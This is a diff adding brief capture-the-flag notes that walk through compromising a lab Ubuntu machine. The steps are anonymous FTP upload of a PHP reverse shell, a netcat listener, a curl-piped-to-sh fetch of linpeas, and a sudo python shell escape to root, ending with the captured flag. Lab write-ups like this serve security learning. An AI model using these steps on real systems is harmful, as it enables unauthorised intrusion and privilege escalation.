@@ -1,0 +1,40 @@
+Ubuntu 16.04 - Old as fuck OS
+It get's an dhcp address
+nmap
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+ftp no auth anonymous
+anonymous has write privileges
+http://ip/files can execute php script
+rev proxy in
+
+nc -v -n -l 2200
+
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+interresting sudoers shrek nopass python 3.5
+Interresting /.runme.sh
+
+cat /.runme.sh
+
+Find hash
+google hash
+youaresmart
+
+Login as shrek with password
+sudo python3.5 -c 'import os; os.system("/bin/sh")'
+or create script.py with:
+import os
+os.system("sh")
+sudo python3.5 script.py
+
+whoami:
+root
+
+cd /root
+cat root.txt
+Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
